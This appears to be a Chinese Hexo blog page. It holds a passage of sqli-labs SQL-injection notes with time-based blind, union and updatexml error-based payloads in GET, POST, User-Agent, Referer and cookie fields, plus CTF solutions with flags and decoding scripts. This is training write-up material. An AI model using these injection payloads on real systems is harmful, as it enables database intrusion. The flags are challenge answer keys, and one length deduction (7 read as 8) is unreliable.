<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用时间盲注</span><br><span class="line">    ?id&#x3D;1&#39; and sleep(5) --+</span><br><span class="line">延时大概5秒，说明可以采用时间盲注</span><br><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;7,sleep(5),1)%20--+</span><br><span class="line">有延迟，说明数据库名称长度为8</span><br></pre></td></tr></table></figure>
<h2 id="Less11"><a href="#Less11" class="headerlink" title="Less11"></a>Less11</h2><p>考察：post注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">方法1：报错注入</span><br><span class="line">	post数据：uname&#x3D;admin1&#39; union select 1,database() #&amp;passwd&#x3D;1</span><br><span class="line">方法2：双查询注入</span><br><span class="line">	post数据：uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(&#39;~&#39;,database()),1) #</span><br><span class="line">	之后与Less5相同</span><br></pre></td></tr></table></figure>
<h2 id="Less15"><a href="#Less15" class="headerlink" title="Less15"></a>Less15</h2><p>考察：post注入，时间盲注</p>
<p>环境有问题，跳过</p>
<h2 id="Less17"><a href="#Less17" class="headerlink" title="Less17"></a>Less17</h2><p>环境有问题</p>
<h2 id="Less18"><a href="#Less18" class="headerlink" title="Less18"></a>Less18</h2><p>考察：head头注入，user_agent注入，双查询注入</p>
<p>阅读源码，插入了uagent字段，但是未做合法性检测，因此可以用双查询注入</p>
<p>burp修改包的head部分中的user–agent</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and updatexml(1,concat(&#39;~&#39;,(database())),1) and &#39;1&#39;&#x3D;&#39;1--+</span><br><span class="line"># 注意最后一定要有and &#39;1&#39;&#x3D;&#39;1 用于闭合引号，否则不能得到结果</span><br></pre></td></tr></table></figure>
<h2 id="Less19"><a href="#Less19" class="headerlink" title="Less19"></a>Less19</h2><p>同Less18，本次uagent的值从referer中获得，因此在referer进行注入</p>
<h2 id="Less20"><a href="#Less20" class="headerlink" title="Less20"></a>Less20</h2><p>考察：cookie注入</p>
<p>正常走一遍流程，发现回显的cookie为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname:admin</span><br></pre></td></tr></table></figure>
<p>再次刷新页面时，在包中会直接发送该cookie</p>
<p>修改该cookie为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and updatexml(1,concat(&#39;~&#39;,(database())),1) and &#39;1&#39;&#x3D;&#39;1--+</span><br></pre></td></tr></table></figure>
<p>得到数据库名</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/15/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" data-id="ckk1u3o490000tsusezlp4y3h" data-title="SQL注入总结" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/12/hello-world/" class="article-date">
  <time class="dt-published" datetime="2021-01-12T13:52:17.596Z" itemprop="datePublished">2021-01-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/12/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/12/hello-world/" data-id="ckk1u3o4j0002tsus73gadf65" data-title="Hello World" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CTF答案记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/31/CTF%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/" class="article-date">
  <time class="dt-published" datetime="2020-12-31T06:40:57.000Z" itemprop="datePublished">2020-12-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/31/CTF%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/">CTF答案记录</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="攻防世界-misc初级"><a href="#攻防世界-misc初级" class="headerlink" title="攻防世界 misc初级"></a>攻防世界 misc初级</h1><h2 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this is flag"></a>this is flag</h2><p>提交flag{th1s_!s_a_d4m0_4la9}即可</p>
<h2 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h2><p>做法1：pdf转word后看到答案</p>
<p>在线转换地址<a target="_blank" rel="noopener" href="https://app.xunjiepdf.com/pdf2word/">https://app.xunjiepdf.com/pdf2word/</a></p>
<p>做法2：chrome打开pdf，直接ctrl+f搜索flag</p>
<h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p>正常打开gif，发现最后有一个二维码</p>
<p>用ps打开gif，找到那一帧，找到对应二维码</p>
<p>二维码需要四个角中三个角添加定位方块，用ps添加定位方块后，随便一个二维码扫描工具得到flag</p>
<h2 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h2><p>得到jar文件，可以用压缩包软件打开文件还原出工程</p>
<p>使用idea打开工程，在爆炸文件下得到明文flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}</p>
<p>提交后显示flag错误，使用base64对flag中内容解码得到但</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;DajiDali_JinwanChiji&#125;</span><br></pre></td></tr></table></figure>
<h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>得到104张黑白图片</p>
<p>使用python读取文件，白为0黑为1，得到一个字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">white &#x3D; open(&quot;.&#x2F;0.jpg&quot;,&quot;rb&quot;).read()</span><br><span class="line">black &#x3D; open(&quot;.&#x2F;1.jpg&quot;,&quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line">flag_dic &#x3D; &quot;&quot;</span><br><span class="line">for i in range(104):</span><br><span class="line">	with open(&quot;.&#x2F;%d.jpg&quot;%i,&quot;rb&quot;) as f:</span><br><span class="line">		if f.read() &#x3D;&#x3D; white:</span><br><span class="line">			flag_dic +&#x3D; &quot;0&quot;</span><br><span class="line">		else:</span><br><span class="line">			flag_dic +&#x3D; &quot;1&quot;</span><br><span class="line">print(flag_dic)</span><br><span class="line"></span><br><span class="line">01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101</span><br></pre></td></tr></table></figure>
<p>使用在线的二进制转字符串工具得到答案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;FuN_giF&#125;</span><br></pre></td></tr></table></figure>
<h2 id="掀桌子"><a href="#掀桌子" class="headerlink" title="掀桌子"></a>掀桌子</h2><p>最大字符不超过f，判断为十六进制</p>
<p>将两个连续数字设为一个字节，代表一个符号。所有字节大于128，而ASCII码表均小于128，故均减去128</p>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str &#x3D; &quot;c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2&quot;</span><br><span class="line">count &#x3D; 0</span><br><span class="line">tempstr &#x3D; &quot;&quot;</span><br><span class="line">ans &#x3D; &quot;&quot;</span><br><span class="line">for s in str:</span><br><span class="line">	tempstr +&#x3D; s</span><br><span class="line">	if len(tempstr) &#x3D;&#x3D; 2:</span><br><span class="line">		ans +&#x3D; chr(int(tempstr, 16) - 128)</span><br><span class="line">		# print(int(tempstr, 16))</span><br><span class="line">		tempstr &#x3D; &quot;&quot;</span><br><span class="line">print(ans)</span><br><span class="line"></span><br><span class="line">Hi, FreshDog! The flag is: hjzcydjzbjdcjkzkcugisdchjyjsbdfr</span><br></pre></td></tr></table></figure>
<h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><p>使用与佛论禅论坛，<a target="_blank" rel="noopener" href="http://keyfc.net/bbs/tools/tudoucode.aspx%EF%BC%8C%E5%AF%B9%E6%96%87%E5%AD%97%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86%E5%BE%97%E5%88%B0">http://keyfc.net/bbs/tools/tudoucode.aspx，对文字进行解密得到</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</span><br></pre></td></tr></table></figure>
<p>根据题目提示，使用ROT13编码进行解密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9</span><br></pre></td></tr></table></figure>
<p>再使用base64进行编码，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;</span><br></pre></td></tr></table></figure>
<h2 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h2><p>工具：福昕pdf编辑器</p>
<p>思路：从pdf文件中找到字符，再进行加解密</p>
<p>去除无用信息后，选中“编辑对象”，框选一大片区域，发现字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB</span><br></pre></td></tr></table></figure>
<p>类似于培根密码，但培根密码为5位一组，不符合。此字符串中只有AB两种字符，类似于二进制，联想摩斯密码，解密后得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1nv151bl3m3554g3&#125;</span><br></pre></td></tr></table></figure>
<h3 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h3><p>采用a和b两种字符表示的字符串，5位字符一组</p>
<h3 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h3><h2 id="simpleRAR"><a href="#simpleRAR" class="headerlink" title="simpleRAR"></a>simpleRAR</h2><p>工具：winhex，stegsolve（图片隐写工具），photoshop</p>
<p>首先下载得到一个rar文件，打开后提示“secure.png”文件头损坏。</p>
<p>尝试使用winrar直接修复，结果是把secure.png直接删除。尝试失败。</p>
<p>上网查阅rar块构成后，将“Cflag is not here?”后十六进制的7A更改为74。成功解压得到secure.png</p>
<p>根据题目提示，将png放入photoshop中。photoshop提示非png文件。</p>
<p>使用winhex打开secure.png，头部标识</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">474946</span><br></pre></td></tr></table></figure>
<p>表示这是一个gif文件。更改后缀名后放入photoshop中，得到两个图层。</p>
<p>分别将两个图层的空白图片放入stegsolve，得到二维码。放入photoshop合成二维码并补充三个角，扫码后得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;yanji4n_bu_we1shi&#125;</span><br></pre></td></tr></table></figure>
<h3 id="rar头部构成"><a href="#rar头部构成" class="headerlink" title="rar头部构成"></a>rar头部构成</h3><p>每个数据块结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HEAD_CRC：校验码，2字节</span><br><span class="line">HEAD_TYPE：块类型，1字节</span><br><span class="line">HEAD_FLAGS：块标记，2字节</span><br><span class="line">最后两字节：块大小</span><br></pre></td></tr></table></figure>
<p>整个RAR文件数据块构成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">标记块：HEAD_TYPE&#x3D;0x72</span><br><span class="line">压缩文件头：HEAD_TYPE&#x3D;0x74</span><br><span class="line">文件头：HEAD_TYPE&#x3D;0x74</span><br></pre></td></tr></table></figure>
<h2 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h2><p>工具：winhex</p>
<p>知识点：zip伪加密，base64隐写</p>
<p>首先要用winhex，修改zip的压缩源文件数据区全局加密处的字节</p>
<p>得到一个文件stego.txt。结合题目提示，对其进行base64解码，并未得到期望的结果。</p>
<p>查阅wp可知考察base64隐写。base64隐写不等于base64解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import msvcrt</span><br><span class="line">import time</span><br><span class="line">b64chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#39;</span><br><span class="line">with open(&#39;stego.txt&#39;, &#39;rb&#39;) as f:</span><br><span class="line">    bin_str &#x3D; &#39;&#39;</span><br><span class="line">    for line in f.readlines():</span><br><span class="line">        # 去除头尾的换行符</span><br><span class="line">        stegb64 &#x3D; str(line, &quot;utf-8&quot;).strip(&quot;\n&quot;)</span><br><span class="line">        # 基于base64解码又编码，达到去除隐写的符号的目的</span><br><span class="line">        row64 &#x3D; str(base64.b64encode(base64.b64decode(stegb64)),&quot;utf-8&quot;)</span><br><span class="line">        # 基于base64的隐写，都在最后一个字符上体现。因此算一下两个字符串最后一个字符的差值</span><br><span class="line">        offset &#x3D; abs(b64chars.index(stegb64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1]) - b64chars.index(row64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1]))</span><br><span class="line">        print(offset)</span><br><span class="line">        #print(stegb64.replace(&#39;&#x3D;&#39;,&#39;&#39;))</span><br><span class="line">        #print(stegb64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1])</span><br><span class="line">        #print(b64chars.index(stegb64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1]))</span><br><span class="line">        #print(b64chars.index(row64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1]))</span><br><span class="line">        # 等号的数量*2等于最后返回字符串的长度</span><br><span class="line">        equalnum &#x3D; stegb64.count(&#39;&#x3D;&#39;)</span><br><span class="line">        if equalnum:</span><br><span class="line">            bin_str +&#x3D; bin(offset)[2:].zfill(equalnum * 2)</span><br><span class="line">        print(bin(offset))</span><br><span class="line">        print(bin(offset)[2:])</span><br><span class="line">        # 右对齐后，在头部填充0</span><br><span class="line">        print(bin(offset)[2:].zfill(equalnum * 2))</span><br><span class="line">        # 8个bit转换为一个字符</span><br><span class="line">        print(&#39;&#39;.join([chr(int(bin_str[i:i+8],2)) for i in range(0, len(bin_str), 8)]))</span><br><span class="line">        # time.sleep(3)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="zip的伪加密"><a href="#zip的伪加密" class="headerlink" title="zip的伪加密"></a>zip的伪加密</h3><p>zip由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志，根据三个区域的不同，区分zip是非加密、伪加密还是加密的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">压缩源文件数据区： </span><br><span class="line">50 4B 03 04：这是头文件标记（0x04034b50） </span><br><span class="line">14 00：解压文件所需 pkware 版本 </span><br><span class="line">00 00：全局方式位标记（有无加密） 头文件标记后2bytes</span><br><span class="line">08 00：压缩方式 </span><br><span class="line">5A 7E：最后修改文件时间 </span><br><span class="line">F7 46：最后修改文件日期 </span><br><span class="line">16 B5 80 14：CRC-32校验（1480B516） </span><br><span class="line">19 00 00 00：压缩后尺寸（25） </span><br><span class="line">17 00 00 00：未压缩尺寸（23） </span><br><span class="line">07 00：文件名长度 </span><br><span class="line">00 00：扩展记录长度 </span><br><span class="line">6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 </span><br><span class="line">压缩源文件目录区： </span><br><span class="line"></span><br><span class="line">50 4B 01 02：目录中文件文件头标记(0x02014b50) </span><br><span class="line"></span><br><span class="line">3F 00：压缩使用的 pkware 版本</span><br><span class="line"></span><br><span class="line">14 00：解压文件所需 pkware 版本 </span><br><span class="line">00 00：全局方式位标记（有无加密，伪加密的关键） 目录文件标记后4bytes</span><br><span class="line">08 00：压缩方式 </span><br><span class="line">5A 7E：最后修改文件时间 </span><br><span class="line">F7 46：最后修改文件日期 </span><br><span class="line">16 B5 80 14：CRC-32校验（1480B516） </span><br><span class="line">19 00 00 00：压缩后尺寸（25） </span><br><span class="line">17 00 00 00：未压缩尺寸（23） </span><br><span class="line">07 00：文件名长度 </span><br><span class="line">24 00：扩展字段长度 </span><br><span class="line">00 00：文件注释长度 </span><br><span class="line">00 00：磁盘开始号 </span><br><span class="line">00 00：内部文件属性 </span><br><span class="line">20 00 00 00：外部文件属性 </span><br><span class="line"></span><br><span class="line">00 00 00 00：局部头部偏移量</span><br><span class="line"></span><br><span class="line">6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 </span><br><span class="line">压缩源文件目录结束标志： </span><br><span class="line">50 4B 05 06：目录结束标记 </span><br><span class="line">00 00：当前磁盘编号 </span><br><span class="line">00 00：目录区开始磁盘编号 </span><br><span class="line">01 00：本磁盘上纪录总数 </span><br><span class="line">01 00：目录区中纪录总数 </span><br><span class="line">59 00 00 00：目录区尺寸大小 </span><br><span class="line"></span><br><span class="line">3E 00 00 00：目录区对第一张磁盘的偏移量</span><br><span class="line"></span><br><span class="line">00 00：ZIP 文件注释长度</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">无加密</span><br><span class="line">压缩源文件数据区的全局加密应当为00 00  （504B0304两个bytes之后）</span><br><span class="line">且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后）</span><br><span class="line"></span><br><span class="line">假加密</span><br><span class="line">压缩源文件数据区的全局加密应当为00 00 </span><br><span class="line">且压缩源文件目录区的全局方式位标记应当为09 00</span><br><span class="line"></span><br><span class="line">真加密</span><br><span class="line">压缩源文件数据区的全局加密应当为09 00 </span><br><span class="line">且压缩源文件目录区的全局方式位标记应当为09 00 </span><br></pre></td></tr></table></figure>
<h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p>原本一个字符使用8bit表示，使用base64编码后改为用6bit表示，不能除尽的部分补0</p>
<h3 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码"></a>base64解码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">检查base64编码后面有几个等于号</span><br><span class="line">把字符串按照base64表转换成4*6的倍数位数二进制</span><br><span class="line">删除等于号的个数*8的bit</span><br><span class="line">按照6个bit一组转成字符</span><br></pre></td></tr></table></figure>
<h3 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">基于base64解码时尾部存在一定数量的bit不会被转义的情况，可以在此处植入想要隐写的字符</span><br></pre></td></tr></table></figure>
<h2 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h2><p>这题没看题解自己做的，感动哭了</p>
<p>首先根据提示，这是一个linux系统光盘文件。放入centos中，使用file命令查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file f1fc23f5c743425d9e0073887c846d23</span><br><span class="line"></span><br><span class="line">Linux rev 1.0 ext3 filesystem data, UUID&#x3D;cf6d7bff-c377-403f-84ae-956ce3c99aaa (needs journal recovery)</span><br></pre></td></tr></table></figure>
<p>网上查阅如何使用ext3文件系统数据，使用mount命令挂载。注意要在root用户权限下使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount -o loop f1fc23f5c743425d9e0073887c846d23 &#x2F;mnt</span><br><span class="line"># -o loop提供了一个虚拟磁盘，&#x2F;mnt是挂载的目录</span><br></pre></td></tr></table></figure>
<p>进入/mnt，随便搜搜flag相关字，发现在flag.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;O7avZhikgKgbF&#x2F;flag.txt</span><br></pre></td></tr></table></figure>
<p>查看flag.txt中的内容，根据字符串其后的等号判断为base64。解码后得到答案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sajbcibzskjjcnbhsbvcjbjszcszbkzj&#125;</span><br></pre></td></tr></table></figure>
<p>网上还有一种用winhex的做法</p>
<h2 id="功夫再高也怕菜刀"><a href="#功夫再高也怕菜刀" class="headerlink" title="功夫再高也怕菜刀"></a>功夫再高也怕菜刀</h2><p>工具：kali的foremost，winhex，wireshark</p>
<p>双击pcapng文件，通过搜索关键字“flag.txt”可知，传输了flag.txt文件</p>
<p>通过kali下的foremost分离出传输flag.txt的压缩包。</p>
<p>通过winhex，发现压缩包是真实加密的，无法通过更改十六进制字符直接获取flag.txt</p>
<p>再次打开pcapng文件，大量的分析tcp流，查找可能相关的的文件。发现6666.jpg文件，还原出6666.jpg文件。</p>
<p>jpg文件头是FFD8FF，文件尾是FFD9。将包含头尾的16进制字符串复制到winhex中，输出一个jpg文件。打开jpg文件，得到压缩包的解压密码</p>
<p>最后得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</span><br></pre></td></tr></table></figure>
<h3 id="各类文件的标志头"><a href="#各类文件的标志头" class="headerlink" title="各类文件的标志头"></a>各类文件的标志头</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jpg：FFD8FF</span><br><span class="line">png：89504E47</span><br><span class="line">gif：47494638</span><br></pre></td></tr></table></figure>


<h1 id="攻防世界-web-初级"><a href="#攻防世界-web-初级" class="headerlink" title="攻防世界 web 初级"></a>攻防世界 web 初级</h1><h2 id="view-souce"><a href="#view-souce" class="headerlink" title="view_souce"></a>view_souce</h2><p>按F12，看到注释源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;ffd40408d5b1b8c2dad9aab623dd93ef&#125;</span><br></pre></td></tr></table></figure>
<h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p>先用御剑或者dirsearch扫描一下给出的网站</p>
<p>得到目录下存在robots.txt文件</p>
<p>访问该文件，网页展示内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: </span><br><span class="line">Disallow: f1ag_1s_h3re.php</span><br></pre></td></tr></table></figure>
<p>访问f1ag_1s_h3re.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;57752958f46d76651078942ee34b88ba&#125;</span><br></pre></td></tr></table></figure>
<h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>同理，用御剑扫一下后台，存在index.php.bak文件</p>
<p>访问这个文件，自动下载文件</p>
<p>使用sublime text打开文件，得到flag</p>
